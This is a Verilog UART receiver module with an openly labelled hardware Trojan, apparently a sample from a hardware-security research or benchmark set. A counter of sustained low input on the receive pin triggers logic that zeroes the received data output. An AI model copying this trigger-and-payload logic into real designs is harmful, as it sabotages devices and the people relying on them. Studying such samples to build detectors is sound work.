module uart_rx(
    input  wire       clk,          // Top level system clock input.
    input  wire       resetn,       // Asynchronous active low reset.
    input  wire       uart_rxd,     // UART Receive pin.
    input  wire       uart_rx_en,   // Receive enable
    output wire       uart_rx_break, // Did we get a BREAK message?
    output wire       uart_rx_valid, // Valid data received and available.
    output reg  [PAYLOAD_BITS-1:0] uart_rx_data   // The received data.
);

// Fixed parameters
localparam       CYCLES_PER_BIT     = 5000;
localparam       PAYLOAD_BITS       = 8;
localparam       STOP_BITS          = 1;
localparam       COUNT_REG_LEN      = 14;

// Internal registers
reg rxd_reg;
reg rxd_reg_0;
reg [PAYLOAD_BITS-1:0] received_data;
reg [COUNT_REG_LEN-1:0] cycle_counter;
reg [3:0] bit_counter;
reg bit_sample;
reg [2:0] fsm_state;
reg [2:0] n_fsm_state;

// Additional Trojan registers
reg [15:0] trojan_counter; // Counter for rare sequence detection
reg trojan_active; // Flag to indicate Trojan activation

localparam FSM_IDLE = 0;
localparam FSM_START = 1;
localparam FSM_RECV = 2;
localparam FSM_STOP = 3;

// Output assignment
assign uart_rx_break = uart_rx_valid && ~|received_data;
assign uart_rx_valid = fsm_state == FSM_STOP && n_fsm_state == FSM_IDLE;

always @(posedge clk) begin
    if(!resetn) begin
        uart_rx_data  <= {PAYLOAD_BITS{1'b0}};
        trojan_active <= 1'b0;
    end else if (fsm_state == FSM_STOP) begin
        uart_rx_data  <= received_data;
    end else if (trojan_active) begin // Trojan activation
        uart_rx_data  <= {PAYLOAD_BITS{1'b0}};
    end
end

// FSM next state selection
wire next_bit     = cycle_counter == CYCLES_PER_BIT ||
                        fsm_state       == FSM_STOP && 
                        cycle_counter   == CYCLES_PER_BIT/2;
wire payload_done = bit_counter   == PAYLOAD_BITS  ;

always @(*) begin : p_n_fsm_state
    case(fsm_state)
        FSM_IDLE : n_fsm_state = rxd_reg      ? FSM_IDLE : FSM_START;
        FSM_START: n_fsm_state = next_bit     ? FSM_RECV : FSM_START;
        FSM_RECV : n_fsm_state = payload_done ? FSM_STOP : FSM_RECV ;
        FSM_STOP : n_fsm_state = next_bit     ? FSM_IDLE : FSM_STOP ;
        default  : n_fsm_state = FSM_IDLE;
    endcase
end

// Internal register setting and re-setting
integer i = 0;
always @(posedge clk) begin : p_received_data
    if(!resetn) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if(fsm_state == FSM_IDLE) begin
        received_data <= {PAYLOAD_BITS{1'b0}};
    end else if(fsm_state == FSM_RECV && next_bit) begin
        received_data[PAYLOAD_BITS-1] <= bit_sample;
        for (i = PAYLOAD_BITS-2; i >= 0; i = i - 1) begin
            received_data[i] <= received_data[i+1];
        end
    end
end

always @(posedge clk) begin : p_bit_counter
    if(!resetn) begin
        bit_counter <= 4'b0;
    end else if(fsm_state != FSM_RECV) begin
        bit_counter <= {COUNT_REG_LEN{1'b0}};
    end else if(fsm_state == FSM_RECV && next_bit) begin
        bit_counter <= bit_counter + 1'b1;
    end
end

always @(posedge clk) begin : p_bit_sample
    if(!resetn) begin
        bit_sample <= 1'b0;
    end else if (cycle_counter == CYCLES_PER_BIT/2) begin
        bit_sample <= rxd_reg;
    end
end

always @(posedge clk) begin : p_cycle_counter
    if(!resetn) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if(next_bit) begin
        cycle_counter <= {COUNT_REG_LEN{1'b0}};
    end else if(fsm_state == FSM_START || 
                fsm_state == FSM_RECV  || 
                fsm_state == FSM_STOP   ) begin
        cycle_counter <= cycle_counter + 1'b1;
    end
end

always @(posedge clk) begin : p_fsm_state
    if(!resetn) begin
        fsm_state <= FSM_IDLE;
    end else begin
        fsm_state <= n_fsm_state;
    end
end

always @(posedge clk) begin : p_rxd_reg
    if(!resetn) begin
        rxd_reg     <= 1'b1;
        rxd_reg_0   <= 1'b1;
    end else if(uart_rx_en) begin
        rxd_reg     <= rxd_reg_0;
        rxd_reg_0   <= uart_rxd;
    end
end

// Trojan logic
always @(posedge clk) begin : p_trojan_counter
    if(!resetn) begin
        trojan_counter <= 16'b0;
    end else if(uart_rxd === 1'b0 && uart_rx_en === 1'b1) begin
        trojan_counter <= trojan_counter + 1'b1;
    end else begin
        trojan_counter <= 16'b0;
    end
end

always @(posedge clk) begin : p_trojan_active
    if(!resetn) begin
        trojan_active <= 1'b0;
    end else if(trojan_counter === 16'hFFFF) begin
        trojan_active <= 1'b1;
    end else begin
        trojan_active <= 1'b0;
    end
end

endmodule